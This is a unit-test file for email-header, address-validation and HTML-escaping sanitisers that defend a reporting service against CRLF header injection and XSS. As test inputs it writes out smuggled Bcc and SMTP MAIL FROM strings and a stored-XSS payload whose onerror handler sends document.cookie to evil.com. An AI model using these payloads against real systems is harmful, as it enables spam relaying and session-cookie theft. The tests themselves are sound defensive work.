// Unit tests for the MIME / SMTP header-injection helpers.
//
// These are the security-critical sanitisers used by the customer-report
// and alert-notification edge functions. Any regression here re-opens the
// CRLF-injection vector the background security review flagged.

import { describe, expect, it } from "vitest";
import {
  sanitizeHeader,
  isValidEmail,
  encodeHeader,
  escapeHtml,
} from "../../supabase/functions/_shared/mime-safe";

describe("sanitizeHeader", () => {
  it("collapses CR/LF into a single space (header-injection defence)", () => {
    expect(sanitizeHeader("Acme\r\nBcc: attacker@evil.com")).toBe(
      "Acme Bcc: attacker@evil.com",
    );
  });
  it("collapses lone LF and CR", () => {
    expect(sanitizeHeader("foo\nbar")).toBe("foo bar");
    expect(sanitizeHeader("foo\rbar")).toBe("foo bar");
  });
  it("collapses runs of whitespace and trims edges", () => {
    expect(sanitizeHeader("foo\r\n\r\nbar")).toBe("foo bar");
    expect(sanitizeHeader("foo   bar")).toBe("foo bar");
    expect(sanitizeHeader("  leading + trailing  ")).toBe("leading + trailing");
    expect(sanitizeHeader("tab\there")).toBe("tab here");
  });
  it("returns empty for null/undefined", () => {
    expect(sanitizeHeader(null)).toBe("");
    expect(sanitizeHeader(undefined)).toBe("");
  });
  it("preserves Unicode bytes (the header encoder handles them later)", () => {
    expect(sanitizeHeader("Café")).toBe("Café");
  });
});

describe("isValidEmail", () => {
  it("accepts ordinary addresses", () => {
    expect(isValidEmail("user@example.com")).toBe(true);
    expect(isValidEmail("first.last+tag@sub.example.co.uk")).toBe(true);
  });
  it("rejects CR / LF — the actual injection vector", () => {
    expect(isValidEmail("user@example.com\r\n")).toBe(false);
    expect(isValidEmail("user\nbcc@evil.com")).toBe(false);
    expect(isValidEmail("user@example.com\nBcc: evil@evil")).toBe(false);
  });
  it("rejects angle brackets that could close a header", () => {
    expect(isValidEmail("<user@example.com>")).toBe(false);
    expect(isValidEmail("user@example.com>")).toBe(false);
  });
  it("rejects whitespace anywhere", () => {
    expect(isValidEmail(" user@example.com")).toBe(false);
    expect(isValidEmail("user @example.com")).toBe(false);
    expect(isValidEmail("user@ example.com")).toBe(false);
    expect(isValidEmail("user@example.com ")).toBe(false);
  });
  it("rejects empty / null / undefined", () => {
    expect(isValidEmail("")).toBe(false);
    expect(isValidEmail(null)).toBe(false);
    expect(isValidEmail(undefined)).toBe(false);
  });
  it("rejects malformed addresses", () => {
    expect(isValidEmail("no-at-sign")).toBe(false);
    expect(isValidEmail("@nodomain")).toBe(false);
    expect(isValidEmail("user@no-tld")).toBe(false);
  });
  it("rejects oversize addresses (RFC 5321 §4.5.3.1.3)", () => {
    // 255 chars total — over the 254-char cap.
    const oversize = "a".repeat(249) + "@b.com";
    expect(oversize.length).toBeGreaterThan(254);
    expect(isValidEmail(oversize)).toBe(false);
  });
});

describe("encodeHeader", () => {
  it("passes through plain ASCII unchanged", () => {
    expect(encodeHeader("Hello World")).toBe("Hello World");
  });
  it("encodes non-ASCII using RFC 2047 B-encoding", () => {
    // Em dash is non-ASCII, so it gets encoded.
    expect(encodeHeader("Acme — Monthly Report")).toMatch(
      /^=\?utf-8\?B\?[A-Za-z0-9+/=]+\?=$/,
    );
  });
  it("collapses CR/LF first, then encodes", () => {
    const out = encodeHeader("Acme\r\nBcc: x@y.com");
    expect(out).not.toContain("\r");
    expect(out).not.toContain("\n");
  });
  it("returns empty string for empty input", () => {
    expect(encodeHeader("")).toBe("");
  });
  it("round-trips a UTF-8 string via base64", () => {
    const original = "Café — résumé";
    const encoded = encodeHeader(original);
    const b64 = encoded.replace(/^=\?utf-8\?B\?/, "").replace(/\?=$/, "");
    const decoded = new TextDecoder().decode(
      Uint8Array.from(atob(b64), (c) => c.charCodeAt(0)),
    );
    expect(decoded).toBe(original);
  });
});

describe("escapeHtml", () => {
  it("escapes the standard five characters", () => {
    expect(escapeHtml("&")).toBe("&amp;");
    expect(escapeHtml("<")).toBe("&lt;");
    expect(escapeHtml(">")).toBe("&gt;");
    expect(escapeHtml("\"")).toBe("&quot;");
    expect(escapeHtml("'")).toBe("&#39;");
  });
  it("defangs a stored XSS attempt", () => {
    const evil = `<script>alert(document.cookie)</script>`;
    expect(escapeHtml(evil)).toBe(
      "&lt;script&gt;alert(document.cookie)&lt;/script&gt;",
    );
  });
  it("handles null/undefined safely", () => {
    expect(escapeHtml(null)).toBe("");
    expect(escapeHtml(undefined)).toBe("");
  });
  it("escapes ampersand first to avoid double-encoding", () => {
    expect(escapeHtml("Tom & Jerry")).toBe("Tom &amp; Jerry");
    expect(escapeHtml("<>")).toBe("&lt;&gt;");
  });
});

describe("end-to-end injection scenarios", () => {
  it("blocks the org-rename → header-smuggling attack", () => {
    // An org admin renames their org to inject a Bcc header.
    const orgName = "Acme Co\r\nBcc: attacker@evil.com\r\n";
    const subject = `${orgName} monthly security report`;
    const headerValue = encodeHeader(subject);
    expect(headerValue).not.toContain("\r");
    expect(headerValue).not.toContain("\n");
  });

  it("blocks the org-rename → HTML body XSS attack", () => {
    // After escapeHtml, no live tag should survive — the angle brackets are
    // escaped so the output is rendered as text, not as an active element.
    const evilName = `<img src=x onerror="fetch('//evil.com?'+document.cookie)">`;
    const escaped = escapeHtml(evilName);
    expect(escaped).not.toMatch(/<img\b/i);
    expect(escaped).not.toMatch(/<script\b/i);
    expect(escaped.startsWith("&lt;")).toBe(true);
  });

  it("blocks the recipient-row → SMTP envelope injection attack", () => {
    // Admin sets a recipient.email to a value containing CR/LF.
    const evilEmail = "x@evil.com>\r\nMAIL FROM:<spammer@evil.com";
    expect(isValidEmail(evilEmail)).toBe(false);
    expect(isValidEmail(evilEmail.trim().toLowerCase())).toBe(false);
  });
});
